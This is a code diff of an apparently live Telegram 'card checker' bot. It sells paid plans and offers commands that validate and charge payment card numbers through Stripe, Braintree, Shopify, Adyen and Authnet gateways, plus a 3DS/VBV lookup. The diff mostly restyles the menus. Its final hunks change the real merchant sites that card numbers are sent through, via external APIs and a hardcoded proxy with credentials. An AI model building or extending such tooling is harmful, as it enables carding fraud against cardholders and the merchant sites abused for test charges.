@@ -470,32 +470,32 @@ async def show_tools_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     text = (
 
-         "✦══ 💎 PREMIUM PLANS 💎 ══✦\n\n"
+         "✧━✧💎𝑷𝑹𝑬𝑴𝑰𝑼𝑴 𝑷𝑳𝑨𝑵𝑺💎✧━✧\n\n"
         "🚀 <b>Starter Plan</b>\n"
-        f"{bullet_link} Credits   : 300\n"
-        f"{bullet_link} Duration  : 7 Days\n"
-        f"{bullet_link} Price     : 3$\n"
+        f"{bullet_link} 𝐂𝐫𝐞𝐝𝐢𝐭𝐬   : 300\n"
+        f"{bullet_link} 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧  : 7 Days\n"
+        f"{bullet_link} 𝐏𝐫𝐢𝐜𝐞     : 3$\n"
         "────────────────────────\n"
 
         "🌟 <b>Premium Plan</b>\n"
-        f"{bullet_link} Credits   : 1000\n"
-        f"{bullet_link} Duration  : 30 Days\n"
-        f"{bullet_link} Price     : 10$\n"
+        f"{bullet_link} 𝐂𝐫𝐞𝐝𝐢𝐭𝐬   : 1000\n"
+        f"{bullet_link} 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧  : 30 Days\n"
+        f"{bullet_link} 𝐏𝐫𝐢𝐜𝐞     : 10$\n"
         "────────────────────────\n"
 
         "💎 <b>Plus Plan</b>\n"
-        f"{bullet_link} Credits   : 2000\n"
-        f"{bullet_link} Duration  : 60 Days\n"
-        f"{bullet_link} Price     : 19$\n"
+        f"{bullet_link} 𝐂𝐫𝐞𝐝𝐢𝐭𝐬   : 2000\n"
+        f"{bullet_link} 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧  : 60 Days\n"
+        f"{bullet_link} 𝐏𝐫𝐢𝐜𝐞     : 19$\n"
         "────────────────────────\n"
 
         "⚡ <b>Custom Plan</b>\n"
-        f"{bullet_link} Credits   : 3000\n"
-        f"{bullet_link} Duration  : Custom\n"
-        f"{bullet_link} Price     : Custom\n"
+        f"{bullet_link} 𝐂𝐫𝐞𝐝𝐢𝐭𝐬   : 3000\n"
+        f"{bullet_link} 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧  : Custom\n"
+        f"{bullet_link} 𝐏𝐫𝐢𝐜𝐞     : Custom\n"
         "────────────────────────\n\n"
 
-        "<b><i>All premium users will be provided with 0.98$ sites</i></b>\n"
+        "<b><i>💎All premium users will be provided with 0.98$ sites</i></b>\n"
         "<b><i>Full Help & Support for any issue</i></b>\n"
         "✦━━━━━━━━━━━━━━━━━━━━✦"
     )
@@ -526,16 +526,16 @@ async def gates_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE)
     await q.answer()
 
     # Stylish single-line header
-    header = "✦══ 🚪 GATES MENU 🚪 ══✦\n\n"
+    header = "━━❖🚪 GATES MENU 🚪❖━━\n\n"
 
     # Bullet link for uniformity
     bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⌇]</a>"
 
     text = (
         f"{header}"
-        f"{bullet_link} <b>Auth Gateway</b> - Access authentication features\n"
-        f"{bullet_link} <b>Charge Gateway</b> - Access payment/charge features\n\n"
-        "<b><i>Full Help & Support available for any issue</i></b>"
+        f"{bullet_link} <b>𝐀𝐮𝐭𝐡 𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> - 𝘼𝙘𝙘𝙚𝙨𝙨 𝙖𝙪𝙩𝙝𝙚𝙣𝙩𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙚𝙖𝙩𝙪𝙧𝙚𝙨\n"
+        f"{bullet_link} <b>𝐂𝐡𝐚𝐫𝐠𝐞 𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> - 𝘼𝙘𝙘𝙚𝙨𝙨 𝙥𝙖𝙮𝙢𝙚𝙣𝙩/𝙘𝙝𝙖𝙧𝙜𝙚 𝙛𝙚𝙖𝙩𝙪𝙧𝙚𝙨\n\n"
+        "<b><i>💡 Need Assistance? 🌟 Full Support Available!</i></b>"
     )
 
     keyboard = InlineKeyboardMarkup([
@@ -570,23 +570,23 @@ async def auth_sub_menu_handler(update: Update, context: ContextTypes.DEFAULT_TY
     bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⌇]</a>"
     
     text = (
-        "✦════════✦🚪 AUTH GATEWAYS 🚪✦════════✦\n\n"
+        "✦━━━✦🚪 𝘼𝙐𝙏𝙃 𝙂𝘼𝙏𝙀𝙎 🚪✦━━✦\n\n"
         
         "🟥 <b>Stripe Auth</b>\n"
-        f"{bullet_link} Single Check : <code>/chk cc|mm|yy|cvv</code>\n"
-        f"{bullet_link} Mass Check   : <code>/mass cc|mm|yy|cvv</code>\n"
-        f"{bullet_link} Status       : Online ✅\n"
-        f"{bullet_link} Last Checked : 5 min ago\n"
+        f"{bullet_link} 𝐒𝐢𝐧𝐠𝐥𝐞 𝐂𝐡𝐞𝐜𝐤 : <code>/chk cc|mm|yy|cvv</code>\n"
+        f"{bullet_link} 𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤   : <code>/mass cc|mm|yy|cvv</code>\n"
+        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬       : 𝑨𝒄𝒕𝒊𝒗𝒆 ✅\n"
+        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲   : 𝑺𝒕𝒓𝒊𝒑𝒆 𝑨𝒖𝒕𝒉\n"
         "────────────────────────\n\n"
         
         "🟦 <b>Braintree Premium</b>\n"
-        f"{bullet_link} Single Auth  : <code>/b3 cc|mm|yy|cvv</code>\n"
-        f"{bullet_link} Status       : Online ✅\n"
-        f"{bullet_link} Last Checked : 3 min ago\n"
+        f"{bullet_link} 𝐒𝐢𝐧𝐠𝐥𝐞 𝐀𝐮𝐭𝐡  : <code>/b3 cc|mm|yy|cvv</code>\n"
+        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬       : 𝑨𝒄𝒕𝒊𝒗𝒆 ✅\n"
+        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲   : 𝑩𝒓𝒂𝒊𝒏𝒕𝒓𝒆𝒆 𝑨𝒖𝒕𝒉\n"
         "────────────────────────\n\n"
 
-        "✨ All gateways are fully accessible with no rate limits.\n"
-        "✦════════════════════════════════✦"
+        "🛡️✨ 𝘼𝗹𝗹 𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 | 𝗡𝗼 𝗥𝗮𝘁𝗲 𝗥𝗲𝘀𝘁𝗿𝗶𝗰𝘁𝗶𝗼𝗻𝘀!\n"
+        "✦════════════════════════✦"
     )
 
     keyboard = InlineKeyboardMarkup([
@@ -619,8 +619,8 @@ async def charge_sub_menu_handler(update: Update, context: ContextTypes.DEFAULT_
     await q.answer()
 
     text = (
-        "✦═══💳 CHARGE GATEWAYS 💳══✦\n\n"
-        "✨ Select a charge gate below:"
+        "❖══💳 CHARGE GATEWAYS 💳══❖\n\n"
+        "💎✨𝘚𝘦𝘭𝘦𝘤𝘵 𝘢 𝘊𝘩𝘢𝘳𝘨𝘦 𝘎𝘢𝘵𝘦 𝘉𝘦𝘭𝘰𝘸✨💎"
     )
 
     # --- Buttons in 2 columns ---
@@ -672,11 +672,11 @@ async def shopify_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYP
     bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⌇]</a>"
 
     text = (
-        "✦════════✦💸 SHOPIFY GATEWAY 0.98$ ✦════════✦\n\n"
-        f"{bullet_link} <code>/sh</code>\n"
-        f"{bullet_link} Status  : <i>Active ✅</i>\n"
-        f"{bullet_link} Gateway : <i>Shopify</i>\n"
-        f"{bullet_link} Price   : <i>$0.98</i>\n"
+        "✦═══ 𝑺𝑯𝑶𝑷𝑰𝑭𝒀 0.98$ ═══✦\n\n"
+        f"{bullet_link} 𝐂𝐌𝐃   :<code>/sh</code>\n"
+        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
+        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>Shopify</i>\n"
+        f"{bullet_link} 𝐏𝐫𝐢𝐜𝐞   : <i>$0.98</i>\n"
     )
 
     keyboard = InlineKeyboardMarkup([
@@ -708,11 +708,11 @@ async def adyen_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE)
     bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⌇]</a>"
 
     text = (
-        "✦════════✦💳 ADYEN GATEWAY 1$ ✦════════✦\n\n"
-        f"{bullet_link} <code>/ad</code>\n"
-        f"{bullet_link} Status  : <i>Active ✅</i>\n"
-        f"{bullet_link} Gateway : <i>Adyen</i>\n"
-        f"{bullet_link} Price   : <i>$1</i>\n"
+        "✦═══ 𝐀𝐝𝐲𝐞𝐧 1$ ═══✦\n\n"
+        f"{bullet_link} 𝐂𝐌𝐃   :<code>/ad</code>\n"
+        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
+        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>Adyen</i>\n"
+        f"{bullet_link} 𝐏𝐫𝐢𝐜𝐞   : <i>$1</i>\n"
     )
 
     keyboard = [
@@ -746,11 +746,11 @@ async def ocean_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE)
     bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⌇]</a>"
 
     text = (
-        "✦════════✦🌊 OCEAN PAYMENTS GATEWAY 4$ ✦════════✦\n\n"
-        f"{bullet_link} <code>/oc</code>\n"
-        f"{bullet_link} Status  : <i>Active ✅</i>\n"
-        f"{bullet_link} Gateway : <i>Ocean Payments</i>\n"
-        f"{bullet_link} Price   : <i>$4</i>\n"
+        "✦═══ 𝐎𝐜𝐞𝐚𝐧 𝐏𝐚𝐲𝐦𝐞𝐧𝐭𝐬 4$ ═══✦\n\n"
+        f"{bullet_link} 𝐂𝐌𝐃   :<code>/oc</code>\n"
+        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
+        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>Ocean Payments</i>\n"
+        f"{bullet_link} 𝐏𝐫𝐢𝐜𝐞   : <i>$4</i>\n"
     )
 
     # Define buttons as a list of rows
@@ -783,14 +783,14 @@ async def autoshopify_gate_handler(update: Update, context: ContextTypes.DEFAULT
     bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⌇]</a>"
 
     text = (
-        "✦════════✦⚡ AUTO SHOPIFY ✦════════✦\n\n"
-        f"{bullet_link} cmd          - <code>/sp</code>\n"
-        f"{bullet_link} mass         - <code>/msp</code>\n"
-        f"{bullet_link} own site     - <code>/seturl &lt;site&gt;</code>\n"
-        f"{bullet_link} multiple sites - <code>/adurls &lt;site&gt;</code>\n\n"
-        f"{bullet_link} Status   : <i>Active ✅</i>\n"
-        f"{bullet_link} Gateway  : <i>Shopify</i>\n"
-        "✦════════════════════════✦"
+        "✦═══ 𝐀𝐮𝐭𝐨 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 ═══✦\n\n"
+        f"{bullet_link} 𝐂𝐌𝐃   : <code>/sp</code>\n"
+        f"{bullet_link} 𝐌𝐚𝐬𝐬     : <code>/msp</code>\n"
+        f"{bullet_link} 𝐎𝐰𝐧 𝐒𝐢𝐭𝐞  : <code>/seturl &lt;site&gt;</code>\n"
+        f"{bullet_link} 𝐌𝐮𝐥𝐭𝐢𝐩𝐥𝐞 𝐒𝐢𝐭𝐞𝐬 : <code>/adurls &lt;site&gt;</code>\n\n"
+        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
+        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>Shopify</i>\n"
+        "✦════════════════════✦"
     )
 
     keyboard = InlineKeyboardMarkup([
@@ -821,12 +821,12 @@ async def shopify10_gate_handler(update: Update, context: ContextTypes.DEFAULT_T
     bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⌇]</a>"
 
     text = (
-        "✦════════✦💵 SHOPIFY GATEWAY 10$ ✦════════✦\n\n"
-        f"{bullet_link} cmd   - <code>/hc</code>\n"
-        f"{bullet_link} Status - <i>Active ✅</i>\n"
-        f"{bullet_link} Gateway - <i>Shopify</i>\n"
-        f"{bullet_link} Price  - <i>$10</i>\n"
-        "✦════════════════════════✦"
+        "✦═══ 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 10$ ═══✦\n\n"
+        f"{bullet_link} 𝐂𝐌𝐃   : <code>/hc</code>\n"
+        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
+        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>Shopify</i>\n"
+        f"{bullet_link} 𝐏𝐫𝐢𝐜𝐞   : <i>$10</i>\n"
+        "✦═══════════════════✦"
     )
 
     keyboard = InlineKeyboardMarkup([
@@ -857,12 +857,12 @@ async def authnet36_gate_handler(update: Update, context: ContextTypes.DEFAULT_T
     bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⌇]</a>"
 
     text = (
-        "✦════════✦🏦 AUTHNET GATEWAY 1.0$ ✦════════✦\n\n"
-        f"{bullet_link} cmd     - <code>/at</code>\n"
-        f"{bullet_link} Status  - <i>Active ✅</i>\n"
-        f"{bullet_link} Gateway - <i>Authnet</i>\n"
-        f"{bullet_link} Price   - <i>$1.0</i>\n"
-        "✦════════════════════════✦"
+        "✦═══ 𝐀𝐮𝐭𝐡𝐍𝐞𝐭 1$ ═══✦\n\n"
+        f"{bullet_link} 𝐂𝐌𝐃   : <code>/at</code>\n"
+        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
+        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>Authnet</i>\n"
+        f"{bullet_link} 𝐏𝐫𝐢𝐜𝐞   : <i>$1.0</i>\n"
+        "✦══════════════════✦"
     )
 
     keyboard = InlineKeyboardMarkup([
@@ -895,12 +895,12 @@ async def stripe_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
     bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⌇]</a>"
 
     text = (
-        "✦════════✦💳 STRIPE GATEWAY 1$ ✦════════✦\n\n"
-        f"{bullet_link} cmd     - <code>/st</code>\n"
-        f"{bullet_link} Status  - <i>Active ✅</i>\n"
-        f"{bullet_link} Gateway - <i>Stripe</i>\n"
-        f"{bullet_link} Price   - <i>$1</i>\n"
-        "✦════════════════════════✦"
+        "✦═══ 𝐒𝐭𝐫𝐢𝐩𝐞 1$ ═══✦\n\n"
+        f"{bullet_link} 𝐂𝐌𝐃   : <code>/st</code>\n"
+        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
+        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>Stripe</i>\n"
+        f"{bullet_link} 𝐏𝐫𝐢𝐜𝐞   : <i>$1</i>\n"
+        "✦════════════════✦"
     )
 
     keyboard = InlineKeyboardMarkup([
@@ -931,12 +931,12 @@ async def stripe3_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYP
     bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⌇]</a>"
 
     text = (
-        "✦════════✦💳 STRIPE GATEWAY 3$ ✦════════✦\n\n"
-        f"{bullet_link} cmd     - <code>/st1</code>\n"
-        f"{bullet_link} Status  - <i>Active ✅</i>\n"
-        f"{bullet_link} Gateway - <i>Stripe</i>\n"
-        f"{bullet_link} Price   - <i>$3</i>\n"
-        "✦════════════════════════✦"
+        "✦═══ 𝐒𝐭𝐫𝐢𝐩𝐞 3$ ═══✦\n\n"
+        f"{bullet_link} 𝐂𝐌𝐃   : <code>/st1</code>\n"
+        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
+        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>Stripe</i>\n"
+        f"{bullet_link} 𝐏𝐫𝐢𝐜𝐞   : <i>$3</i>\n"
+        "✦════════════════✦"
     )
 
     keyboard = InlineKeyboardMarkup([
@@ -967,11 +967,11 @@ async def ds_lookup_menu_handler(update: Update, context: ContextTypes.DEFAULT_T
     bullet_link = f"<a href='{BULLET_GROUP_LINK}'>[⌇]</a>"
 
     text = (
-        "✦════════✦🔐 3DS LOOKUP ✦════════✦\n\n"
-        f"{bullet_link} cmd     - <code>/vbv &lt;card|mm|yy|cvv&gt;</code>\n"
-        f"{bullet_link} Status  - <i>Active ✅</i>\n"
-        f"{bullet_link} Gateway - <i>3DS / VBV</i>\n"
-        "✦════════════════════════✦"
+        "🔎━━ 𝟑𝐃𝐒 𝐋𝐨𝐨𝐤 𝐔𝐏 ━━💳\n\n"
+        f"{bullet_link} 𝐂𝐌𝐃   : <code>/vbv &lt;card|mm|yy|cvv&gt;</code>\n"
+        f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
+        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>3DS / VBV</i>\n"
+        "✦════════════════════✦"
     )
 
     keyboard = InlineKeyboardMarkup([
@@ -1751,7 +1751,7 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
         # Call main API
         api_url = (
             "https://darkboy-auto-stripe-y6qk.onrender.com/"
-            f"gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
+            f"gateway=autostripe/key=darkboy/site=shebrews.org/cc={cc_normalized}"
         )
         async with aiohttp.ClientSession() as session:
             async with session.get(api_url, timeout=55) as resp:
@@ -2043,7 +2043,7 @@ async def process_st(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         # --- API request ---
         api_url = (
             f"https://auto-shopify-6cz4.onrender.com/index.php"
-            f"?site=https://vasileandpavel.com"
+            f"?site=https://jovs.com"
             f"&cc={full_card}"
             f"&gateway=stripe"
             f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
@@ -2205,7 +2205,7 @@ from db import get_user, update_user
 # --- SETTINGS ---
 API_URL_TEMPLATE = (
     "https://darkboy-auto-stripe-y6qk.onrender.com/"
-    "gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc="
+    "gateway=autostripe/key=darkboy/site=shebrews.org/cc="
 )
 CONCURRENCY = 3
 RATE_LIMIT_SECONDS = 5
